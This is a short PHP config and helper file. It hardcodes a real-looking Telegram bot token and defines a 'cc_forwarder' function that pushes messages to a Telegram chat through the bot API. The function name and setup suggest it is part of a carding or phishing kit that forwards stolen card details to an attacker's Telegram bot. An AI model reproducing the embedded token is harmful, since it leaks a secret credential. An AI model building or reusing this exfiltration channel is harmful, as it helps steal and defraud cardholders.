<?php

$bot_logs_channel_id = 123;

$appconfig = array(
    "site_title" => "King",
    "app_version" => "1.0.1",
    "author" => "KING",
    "site_auth" => "KING"
);

$hyper_config =  array(
    "bot_token" => "5462784342:AAH94ii9rW0ekaPi9WSS3RoSvFwqZ8kx2Mk",
    "creator" => "KING"
);
$bot_token = $hyper_config['bot_token'];

function cc_forwarder($chatId, $message, $mode="HTML")
{
    $website = "https://api.telegram.org/bot" . $GLOBALS['bot_token'];
    $url = $website . "/sendMessage?chat_id=" . $chatId . "&text=" . urlencode($message)."&parse_mode=$mode";
    url_get_contents($url);
}

function url_get_contents($Url)
{
    if (!function_exists('curl_init')) {
        die('CURL not found');
    }
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $Url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $output = curl_exec($ch);
    curl_close($ch);
    return $output;
}
